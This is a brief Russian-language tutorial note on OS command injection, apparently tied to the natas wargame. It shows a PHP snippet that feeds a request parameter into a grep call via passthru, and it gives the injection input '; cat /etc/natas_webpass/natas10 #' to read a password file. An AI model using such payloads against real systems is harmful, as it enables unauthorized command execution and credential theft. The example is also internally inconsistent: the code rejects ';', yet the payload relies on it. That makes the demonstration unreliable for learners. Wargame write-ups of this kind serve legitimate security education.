**OS Command Injection (инъекция команд операционной системы)** — тип атаки на приложение, предоставляющий злоумышленнику возможность **несанкционированного выполнения команд операционной системы** на некоторой машине.

например в приложении вот такой код:
```
`<?   
$key = "";      
if(array_key_exists("needle", $_REQUEST)) {    
	$key = $_REQUEST["needle"];   
}      
	
if($key != "") {       
	if(preg_match('/[;|&]/',$key)) {           
		print "Input contains an illegal character!";       
	} else {        
		passthru("grep -i $key dictionary.txt");       
	}   
}   
?>`
```
здесь можно ввести `; cat /etc/natas_webpass/natas10 #`